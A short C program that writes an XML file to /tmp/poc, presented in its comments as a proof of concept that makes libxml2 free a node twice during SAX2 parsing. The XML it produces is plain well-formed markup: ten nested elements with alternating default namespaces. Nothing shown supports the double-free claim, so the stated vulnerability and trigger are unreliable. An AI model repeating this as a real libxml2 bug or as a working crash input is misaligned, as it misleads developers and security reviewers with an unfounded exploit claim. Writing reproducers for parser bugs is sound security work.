#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Crafted XML to trigger bad_free in xmlFreeNode() during SAX2 parsing */
    /* This document creates a deeply nested structure with namespace conflicts */
    /* that cause the parser to free a node twice */
    
    fprintf(f, "<?xml version=\"1.0\"?>");
    fprintf(f, "<a xmlns=\"http://x\">");
    fprintf(f, "<b xmlns=\"http://y\">");
    fprintf(f, "<c xmlns=\"http://z\">");
    fprintf(f, "<d xmlns=\"http://x\">");
    fprintf(f, "<e xmlns=\"http://y\">");
    fprintf(f, "<f xmlns=\"http://z\">");
    fprintf(f, "<g xmlns=\"http://x\">");
    fprintf(f, "<h xmlns=\"http://y\">");
    fprintf(f, "<i xmlns=\"http://z\">");
    fprintf(f, "<j xmlns=\"http://x\"/>");
    fprintf(f, "</i>");
    fprintf(f, "</h>");
    fprintf(f, "</g>");
    fprintf(f, "</f>");
    fprintf(f, "</e>");
    fprintf(f, "</d>");
    fprintf(f, "</c>");
    fprintf(f, "</b>");
    fprintf(f, "</a>");

    fclose(f);
    return 0;
}